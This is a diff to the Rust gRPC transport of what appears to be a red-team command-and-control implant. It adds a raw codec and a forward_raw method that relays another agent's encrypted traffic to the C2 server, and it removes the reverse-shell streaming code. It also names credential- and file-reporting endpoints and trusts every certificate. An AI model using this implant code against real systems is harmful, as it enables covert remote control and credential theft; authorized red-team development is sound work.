@@ -1,4 +1,5 @@
 use anyhow::Result;
+use bytes::{Buf, BufMut};
 use http::Uri;
 use pb::c2::*;
 use pb::config::Config;
@@ -13,6 +14,54 @@ use crate::Transport;
 
 use crate::tls_utils::AcceptAllCertVerifier;
 use std::sync::Arc;
+
+// RawCodec is a passthrough tonic codec that sends/receives raw byte slices unchanged.
+// Used by forward_raw so that pre-encrypted bytes from Agent B aren't re-encoded.
+#[derive(Debug, Default, Clone)]
+struct RawCodec;
+impl tonic::codec::Codec for RawCodec {
+    type Encode = Vec<u8>;
+    type Decode = Vec<u8>;
+    type Encoder = RawEncoder;
+    type Decoder = RawDecoder;
+    fn encoder(&mut self) -> Self::Encoder {
+        RawEncoder
+    }
+    fn decoder(&mut self) -> Self::Decoder {
+        RawDecoder
+    }
+}
+#[derive(Debug, Default, Clone)]
+struct RawEncoder;
+impl tonic::codec::Encoder for RawEncoder {
+    type Item = Vec<u8>;
+    type Error = tonic::Status;
+    fn encode(
+        &mut self,
+        item: Self::Item,
+        buf: &mut tonic::codec::EncodeBuf<'_>,
+    ) -> std::result::Result<(), Self::Error> {
+        buf.put_slice(&item);
+        Ok(())
+    }
+}
+#[derive(Debug, Default, Clone)]
+struct RawDecoder;
+impl tonic::codec::Decoder for RawDecoder {
+    type Item = Vec<u8>;
+    type Error = tonic::Status;
+    fn decode(
+        &mut self,
+        buf: &mut tonic::codec::DecodeBuf<'_>,
+    ) -> std::result::Result<Option<Self::Item>, Self::Error> {
+        if !buf.has_remaining() {
+            return Ok(None);
+        }
+        let chunk = buf.chunk().to_vec();
+        buf.advance(chunk.len());
+        Ok(Some(chunk))
+    }
+}
 use std::time::Duration;
 
 #[derive(Clone)]
@@ -59,7 +108,6 @@ static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
 static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
-static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
 #[allow(clippy::upper_case_acronyms)]
@@ -177,9 +225,8 @@ impl Transport for GRPC {
         request: FetchAssetRequest,
         tx: Sender<FetchAssetResponse>,
     ) -> Result<()> {
-        #[cfg(debug_assertions)]
+        #[cfg(feature = "print_debug")]
         let filename = request.name.clone();
-
         let resp = self.fetch_asset_impl(request).await?;
         let mut stream = resp.into_inner();
         tokio::spawn(async move {
@@ -193,7 +240,7 @@ impl Transport for GRPC {
                         }
                     },
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to download file: {}: {}", filename, _err);
 
                         return;
@@ -202,7 +249,7 @@ impl Transport for GRPC {
                 match tx.send(msg) {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!(
                             "failed to send downloaded file chunk: {}: {}",
                             filename,
@@ -251,44 +298,6 @@ impl Transport for GRPC {
         Ok(resp.into_inner())
     }
 
-    async fn reverse_shell(
-        &mut self,
-        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
-        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
-    ) -> Result<()> {
-        // Wrap PTY output receiver in stream
-        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
-
-        // Open gRPC Bi-Directional Stream
-        let resp = self.reverse_shell_impl(req_stream).await?;
-        let mut resp_stream = resp.into_inner();
-
-        // Spawn task to deliver PTY input
-        tokio::spawn(async move {
-            while let Some(msg) = match resp_stream.message().await {
-                Ok(m) => m,
-                Err(_err) => {
-                    #[cfg(debug_assertions)]
-                    log::error!("failed to receive gRPC stream response: {}", _err);
-
-                    None
-                }
-            } {
-                match tx.send(msg).await {
-                    Ok(_) => {}
-                    Err(_err) => {
-                        #[cfg(debug_assertions)]
-                        log::error!("failed to queue pty input: {}", _err);
-
-                        return;
-                    }
-                }
-            }
-        });
-
-        Ok(())
-    }
-
     async fn create_portal(
         &mut self,
         rx: tokio::sync::mpsc::Receiver<CreatePortalRequest>,
@@ -306,7 +315,7 @@ impl Transport for GRPC {
             while let Some(msg) = match resp_stream.message().await {
                 Ok(m) => m,
                 Err(_err) => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("failed to receive gRPC stream response: {}", _err);
 
                     None
@@ -315,7 +324,7 @@ impl Transport for GRPC {
                 match tx.send(msg).await {
                     Ok(_) => {}
                     Err(_err) => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("failed to queue portal input: {}", _err);
 
                         return;
@@ -341,6 +350,59 @@ impl Transport for GRPC {
 
     fn list_available(&self) -> Vec<String> {
         vec!["grpc".to_string()]
+    }
+
+    async fn forward_raw(
+        &mut self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> anyhow::Result<()> {
+        if self.grpc.is_none() {
+            return Err(anyhow::anyhow!("grpc client not created"));
+        }
+        self.grpc
+            .as_mut()
+            .unwrap()
+            .ready()
+            .await
+            .map_err(|e| anyhow::anyhow!("Service was not ready: {}", e))?;
+
+        // Agent B already ChaCha-encodes its messages before sending over UDS/TCP.
+        // Using RawCodec here forwards those bytes unchanged so Tavern sees
+        // exactly one layer of ChaCha encryption (not two).
+        let codec = RawCodec;
+        let uri_path = tonic::codegen::http::uri::PathAndQuery::try_from(path)?;
+
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);
+        let req = tonic::Request::new(req_stream);
+
+        let resp = self
+            .grpc
+            .as_mut()
+            .unwrap()
+            .streaming(req, uri_path, codec)
+            .await?;
+        let mut resp_stream = resp.into_inner();
+
+        tokio::spawn(async move {
+            while let Some(msg) = match resp_stream.message().await {
+                Ok(m) => m,
+                Err(_err) => {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("failed to receive gRPC stream response: {}", _err);
+                    None
+                }
+            } {
+                if tx.send(msg).await.is_err() {
+                    #[cfg(feature = "print_debug")]
+                    log::error!("failed to queue remote input");
+                    return;
+                }
+            }
+        });
+
+        Ok(())
     }
 }
 
@@ -523,37 +585,6 @@ impl GRPC {
         req.extensions_mut()
             .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
         self.grpc.as_mut().unwrap().unary(req, path, codec).await
-    }
-
-    async fn reverse_shell_impl(
-        &mut self,
-        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
-    ) -> std::result::Result<
-        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
-        tonic::Status,
-    > {
-        if self.grpc.is_none() {
-            return Err(tonic::Status::new(
-                tonic::Code::FailedPrecondition,
-                "grpc client not created".to_string(),
-            ));
-        }
-        self.grpc.as_mut().unwrap().ready().await.map_err(|e| {
-            tonic::Status::new(
-                tonic::Code::Unknown,
-                format!("Service was not ready: {}", e),
-            )
-        })?;
-        let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
-        let mut req = request.into_streaming_request();
-        req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
-        self.grpc
-            .as_mut()
-            .unwrap()
-            .streaming(req, path, codec)
-            .await
     }
 
     async fn create_portal_impl(
